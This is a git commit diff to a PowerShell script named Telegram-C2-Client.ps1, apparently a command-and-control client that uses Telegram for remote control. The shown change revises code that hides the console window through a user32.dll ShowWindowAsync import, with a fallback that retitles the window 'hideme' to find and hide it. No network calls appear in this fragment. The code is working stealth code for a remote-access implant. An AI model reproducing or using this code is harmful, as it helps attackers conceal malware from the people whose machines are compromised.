e40bc76c86508a3e800894fab29edaac95ab1234
egieb <93350544+beigeworm@users.noreply.github.com>
2023-12-20 14:11:52 +0000

    Update Telegram-C2-Client.ps1

--- Telegram-C2-Client.ps1
+++ Telegram-C2-Client.ps1
@@ -26,20 +26,17 @@ $lastexecMessageID=""
 # Hide the console window
 If ($HideWindow -gt 0){
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
-$Type = Add-Type -Member $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
 $hwnd = (Get-Process -PID $pid).MainWindowHandle
-
-# if running in powershell console
-if($hwnd -ne [System.IntPtr]::Zero){
-$Type::ShowWindowAsync($hwnd, 0)
-}
-# if running in windows terminal app
-else{
-$Host.UI.RawUI.WindowTitle = 'hideme'
-$Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
-$hwnd = $Proc.MainWindowHandle
-$Type::ShowWindowAsync($hwnd, 0)
-}
+    if($hwnd -ne [System.IntPtr]::Zero){
+        $Type::ShowWindowAsync($hwnd, 0)
+    }
+    else{
+        $Host.UI.RawUI.WindowTitle = 'hideme'
+        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
+        $hwnd = $Proc.MainWindowHandle
+        $Type::ShowWindowAsync($hwnd, 0)
+    }
 }
 
 # Check version and update
